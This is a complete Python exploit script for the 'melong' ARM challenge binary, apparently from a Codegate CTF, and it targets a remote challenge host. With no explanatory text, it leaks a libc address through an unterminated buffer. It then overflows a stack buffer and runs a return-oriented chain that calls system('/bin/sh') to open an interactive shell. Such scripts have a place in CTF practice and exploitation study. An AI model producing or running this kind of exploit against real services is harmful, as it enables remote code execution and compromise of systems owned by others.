#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './melong'
context(os = 'linux', arch = 'arm')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':['qemu-arm-static', '-L', '/usr/arm-linux-gnueabi', '-g', '1234', bin_file]}, \
                        local   = {'argv':['qemu-arm-static', '-L', '/usr/arm-linux-gnueabi', bin_file]}, \
                        remote  = {'host':'ch41l3ng3s.codegate.kr', 'port':1199})
env.select()

#==========

binf = ELF(bin_file)
addr_pop_r0         = 0x11bbc
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']
'''

libc = ELF('/usr/arm-linux-gnueabi/lib/libc-2.23.so')

#==========

def attack(conn):
    conn.sendlineafter('Type the number:', '1')
    conn.sendlineafter('Your height(meters) : ', '1')
    conn.sendlineafter('Your weight(kilograms) : ', '30')

    conn.sendlineafter('Type the number:', '3')
    conn.sendlineafter('training?\n', '-1')

    conn.sendlineafter('Type the number:', '4')
    conn.send('a'*0xb+'!')
    conn.recvuntil('a!')
    libc.address = u32(conn.recv(4)) - 0xbfd4
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = libc.search('/bin/sh').next()

    rop = ROP(libc)

    exploit  = 'a'*0x54
    exploit += p32(addr_pop_r0)
    exploit += p32(addr_libc_str_sh)
    exploit += p32(addr_libc_system)
    conn.sendlineafter('Type the number:', '4')
    conn.send(exploit)

    conn.sendlineafter('Type the number:', '6')

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
